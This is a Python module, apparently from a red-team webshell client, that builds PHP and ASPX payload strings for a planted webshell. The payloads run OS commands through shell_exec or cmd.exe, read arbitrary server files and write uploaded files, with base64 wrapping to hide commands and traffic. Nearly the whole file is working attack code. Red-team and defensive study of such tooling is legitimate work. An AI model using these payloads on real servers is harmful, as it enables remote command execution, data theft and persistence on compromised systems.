## Title:       code_commands.py
## Author:      Joe Vest
## Description: Webshell code and commands references

import base64

def remote_command(language, cmd_type, mode, rsp_header, rsp_footer, command):
    """
    language        Webshell language
    cmd_type        Command type
    mode            Traffic Encoding type (clear, base64_post, base64_server)
    command         Command to execute 

    Valid Command Types
    -------------------
    OS              OS command to execute
    CODE            Arbitray code to execute
    """

    language = language.lower()
    code = ''
    
    ########################
    # PHP - Start
    ########################
    if (language == "php"):

        ########################
        # OS command
        if (cmd_type == "OS"):

            # Apply MODE Encoding for Result generated by code
            # Include Header and Footer wrappers in the output

            # Note: all OS commands should be wrapped in Base64 to help eliminate weird escaping issues

            if mode == "clear":
                code = """echo("{}" . shell_exec(base64_decode('{}'). " 2>&1") . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
            if mode == "base64_post":
                code = """echo("{}" . base64_encode(shell_exec(base64_decode('{}') . " 2>&1")) . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
            if mode == "base64_header":
                code = """echo("{}" . base64_encode(shell_exec(base64_decode('{}') . " 2>&1")) . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)


        elif (cmd_type == "DOWNLOAD"):
            if mode == "clear":
                code = """if (file_exists("{}")) {{
                           $contents = file_get_contents("{}");
                           $result = $contents;  
                           echo("{}" . $result . "{}");
                           die;
                           }}""".format(command,command,rsp_header,rsp_footer)
            if mode == "base64_post":
                code = """if (file_exists("{}")) {{
                           $contents = file_get_contents("{}");
                           $result = base64_encode($contents);  
                           echo("{}" . $result . "{}");
                           die;
                           }}""".format(command,command,rsp_header,rsp_footer)
            if mode == "base64_header":
                code = """if (file_exists("{}")) {{
                           $contents = file_get_contents("{}");
                           $result = base64_encode($contents);  
                           echo("{}" . $result . "{}");
                           die;
                           }}""".format(command,command,rsp_header,rsp_footer)

        elif (cmd_type == "UPLOAD"):
            src = command[0]
            dst = command[1] 

            if mode == "clear":
                code = """
                       $a = file_put_contents("{}", "{}");
                       if ($a == "") {{
                        $result = "\tUpload Failed";
                        }} else {{
                        $result = "\tUpload Complete";
                       }}
                       echo("{}" . $result . "{}");
                       die;
                          """.format(dst,src,rsp_header,rsp_footer)
            if mode == "base64_post":
                src = base64.b64encode(src)
                dst = base64.b64encode(dst)

                code = """
                       $a = file_put_contents(base64_decode("{}"), base64_decode("{}"));
                       if ($a == "") {{
                        $result = base64_encode("\tUpload Failed");
                        }} else {{
                        $result = base64_encode("\tUpload Complete");
                       }}
                       echo("{}" . $result . "{}");
                       die;
                          """.format(dst,src,rsp_header,rsp_footer)

            if mode == "base64_header":
                src = base64.b64encode(src)
                dst = base64.b64encode(dst)
                
                code = """
                       $a = file_put_contents(base64_decode("{}"), base64_decode("{}"));
                       if ($a == "") {{
                        $result = base64_encode("\tUpload Failed");
                        }} else {{
                        $result = base64_encode("\tUpload Complete");
                       }}
                       echo("{}" . $result . "{}");
                       die;
                          """.format(dst,src,rsp_header,rsp_footer)

        ########################
        # Arbitray PHP code
        elif (cmd_type == "CODE"): 
            if mode == "clear":
                code = 'echo(' + '"' + rsp_header + '"' + ' . ' + '"Command sent". ' + '"' + rsp_footer + '"' + ');'
            if mode == "base64_post":
                code = 'echo(' + '"' + rsp_header + '"' + ' . ' + 'base64_encode("Command sent"). ' + '"' + rsp_footer + '"' + ');'

    ########################
    # PHP - End
    ########################

    ########################
    # ASPX - Start
    ########################

    elif(language == "aspx"):

        ########################
        # OS command
        if (cmd_type == "OS"):

            # Apply MODE Encoding for Result generated by code
            # Include Header and Footer wrappers in the output

            # Note: all OS commands should be wrapped in Base64 to help eliminate weird escaping issues

            if mode == "clear":
                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{(base64.b64encode(command)).decode()}"));'\
                'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
                'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
                'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;'\
                f'EI=e.StandardError;e.Close();Response.Write("{rsp_header}"+out.ReadToEnd()+EI.ReadToEnd()+"{rsp_footer}");'


            if mode == "base64_post":
                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{(base64.b64encode(command)).decode()}"));'\
                'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
                'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
                'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();'\
                f'Response.Write("{rsp_header}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{rsp_footer}");'

            if mode == "base64_header":
                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{(base64.b64encode(command)).decode()}"));'\
                'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
                'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
                'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;'\
                f'EI=e.StandardError;e.Close();Response.Write("{rsp_header}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{rsp_footer}");'

        elif (cmd_type == "DOWNLOAD"):
            if mode == "clear":
              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);Response.Write("{}");Response.BinaryWrite(buff);Response.Write("{}");}}""".format((base64.b64encode(command)).decode(),rsp_header,rsp_footer)

            if mode == "base64_post":
              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);var s = Convert.ToBase64String(buff);Response.Write("{}");Response.Write(s);Response.Write("{}");}}""".format((base64.b64encode(command)).decode(),rsp_header,rsp_footer)

            if mode == "base64_header":
              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);var s = Convert.ToBase64String(buff);Response.Write("{}");Response.Write(s);Response.Write("{}");}}""".format((base64.b64encode(command)).decode(),rsp_header,rsp_footer)

    ########################
    # ASPX - End
    ########################

    ########################
    # ENCODE/DECODE HTTP Request
    # If updates made, modify HTTP Request (sendcommands(...)) as well
    # Apply MODE (HTTP Request) to Encode prior to sending sequest

    if mode == "clear":
        code = code
    if mode == "base64_post":
        code = base64.b64encode(code)
    if mode == "base64_header":
        code = base64.b64encode(code)

    return code



